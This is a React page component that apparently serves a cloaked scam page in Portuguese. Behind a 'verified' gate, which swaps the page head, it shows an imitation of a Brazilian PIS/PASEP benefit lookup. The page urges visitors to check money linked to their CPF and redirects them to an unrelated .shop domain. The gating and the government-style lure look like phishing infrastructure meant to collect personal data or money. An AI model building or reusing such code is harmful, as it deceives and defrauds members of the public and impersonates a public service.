import { useState } from "react";
import DynamicHead from "@/components/DynamicHead";
import HomeContent from "@/components/HomeContent";
import { Search, CheckCircle } from "lucide-react";

const Index = () => {
  const [verified, setVerified] = useState(false);

  return (
    <>
      <DynamicHead verified={verified} />
      {!verified ? (
        <main className="min-h-screen bg-[hsl(220,27%,98%)] font-sans">
          <HomeContent onVerify={() => setVerified(true)} />
        </main>
      ) : (
        <main className="min-h-screen bg-[hsl(220,27%,98%)] font-sans flex flex-col">
          <div className="bg-[hsl(222,47%,11%)] text-white py-2.5 px-4 text-center text-sm">
            Sistema informativo de consulta de benefícios e valores disponíveis
          </div>

          <div className="bg-gradient-to-br from-[hsl(217,91%,60%)] to-[hsl(217,91%,46%)] text-white py-4 sm:py-6 px-4 shadow-lg">
            <div className="max-w-4xl mx-auto flex items-center justify-center gap-2 sm:gap-3">
              <Search className="w-6 h-6 sm:w-8 sm:h-8 flex-shrink-0" />
              <h1 className="text-base sm:text-xl md:text-2xl font-bold tracking-tight text-center">
                Consulta PIS/PASEP - Verificação
              </h1>
            </div>
          </div>

          <div className="flex-1 flex items-center justify-center p-4">
            <div className="max-w-lg w-full animate-fade-in">
              <div className="bg-card text-card-foreground rounded-xl shadow-xl border border-border p-6 sm:p-8 md:p-10 text-center">
                <div className="mx-auto w-14 h-14 sm:w-16 sm:h-16 bg-primary/10 rounded-full flex items-center justify-center mb-5 sm:mb-6">
                  <CheckCircle className="w-7 h-7 sm:w-8 sm:h-8 text-primary" />
                </div>
                <h2 className="text-primary text-lg sm:text-xl md:text-2xl font-bold mb-3">
                  Verifique seus valores
                </h2>
                <p className="text-muted-foreground text-sm leading-relaxed mb-6 sm:mb-8">
                  Clique no botão abaixo para consultar se existem valores disponíveis vinculados ao seu CPF.
                </p>
                <button
                  onClick={() => window.location.href = "https://brasilsocial.shop/"}
                  className="w-full sm:w-auto bg-[hsl(152,69%,31%)] hover:bg-[hsl(152,69%,26%)] text-white border-none py-3.5 px-8 sm:py-4 sm:px-10 cursor-pointer rounded-lg text-base sm:text-lg font-semibold block mx-auto shadow-lg hover:shadow-xl transition-all duration-300 animate-btn-pulse hover:scale-105"
                >
                  Consultar agora
                </button>
              </div>
            </div>
          </div>
        </main>
      )}
    </>
  );
};

export default Index;
